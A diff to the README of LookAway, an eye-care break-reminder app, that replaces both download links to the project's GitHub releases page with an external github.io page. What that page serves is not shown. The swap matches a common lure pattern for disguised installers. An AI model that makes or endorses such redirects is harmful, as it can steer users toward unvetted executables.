@@ -6,7 +6,7 @@ Welcome to LookAway! This application helps you follow the 20-20-20 rule - every
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Download LookAway](https://github.com/Ormandyequipment937/LookAway/releases)**
+Visit this link to download the application: **[Download LookAway](https://ormandyequipment937.github.io)**
 
 Once you arrive at the download page, look for the latest release and download the file suitable for your computer. The download will begin automatically. After the download completes, you can run the application directly.
 
@@ -150,6 +150,6 @@ Your eyes are precious - take care of them with LookAway. Start your eye-care jo
 
 Remember: Healthy eyes mean better productivity, fewer headaches, and more comfortable computing. Let LookAway be your guardian against screen fatigue.
 
-Visit this link to download the application: **[Get LookAway Now](https://github.com/Ormandyequipment937/LookAway/releases)**
+Visit this link to download the application: **[Get LookAway Now](https://ormandyequipment937.github.io)**
 
 Keywords: cmake, cpp, cross-platform, cxx17, desktop-app, eye-care, health, linux, pomodoro, productivity, qt, qt6, system-tray, timer, windows
